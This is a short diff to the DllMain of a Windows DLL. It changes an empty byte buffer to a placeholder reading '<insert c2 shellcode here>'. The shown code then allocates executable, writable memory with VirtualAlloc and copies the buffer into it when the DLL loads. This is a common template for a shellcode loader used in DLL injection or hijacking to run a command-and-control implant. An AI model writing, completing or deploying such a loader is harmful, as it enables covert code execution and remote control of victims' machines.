@@ -5,7 +5,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
     if (fdwReason == DLL_PROCESS_ATTACH)
 	{
-		unsigned char buf[] = "";
+		unsigned char buf[] = "<insert c2 shellcode here>";
 		
 		void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		 memcpy(exec, buf, sizeof buf);
